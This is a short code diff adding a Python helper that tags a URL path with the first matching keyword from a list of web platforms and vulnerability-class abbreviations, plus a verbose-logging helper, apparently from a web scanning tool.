+    def _signal_from_path(self, path: str) -> str:
+        lowered = (path or "").lower()
+        for signal in [
+            "wordpress",
+            "joomla",
+            "drupal",
+            "django",
+            "flask",
+            "tomcat",
+            "phpmyadmin",
+            "grafana",
+            "kibana",
+            "graphql",
+            "swagger",
+            "sqli",
+            "xss",
+            "lfi",
+            "ssrf",
+            "xxe",
+            "rce",
+        ]:
+            if signal in lowered:
+                return signal
+        return ""
+
+    def _verbose(self, message: str):
+        if self.verbose:
+            print_info(message)
